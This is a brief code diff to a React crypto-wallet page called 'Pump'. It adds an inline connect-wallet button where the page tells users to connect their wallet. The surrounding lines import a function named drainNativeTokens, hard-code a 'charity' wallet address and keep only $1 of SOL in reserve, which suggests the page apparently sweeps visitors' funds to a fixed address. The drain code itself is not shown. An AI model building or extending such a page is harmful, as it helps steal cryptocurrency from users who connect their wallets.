@@ -15,6 +15,7 @@ import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
+import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const SOL_RESERVE_USD = 1.0; // Always leave $1 worth of SOL
@@ -402,6 +403,7 @@ const Pump = () => {
                   <p className="text-muted-foreground mb-4">
                     Connect your wallet to view assets
                   </p>
+                  <InlineConnectWallet />
                 </div>
               ) : isLoading ? (
                 <div className="flex items-center justify-center py-8">
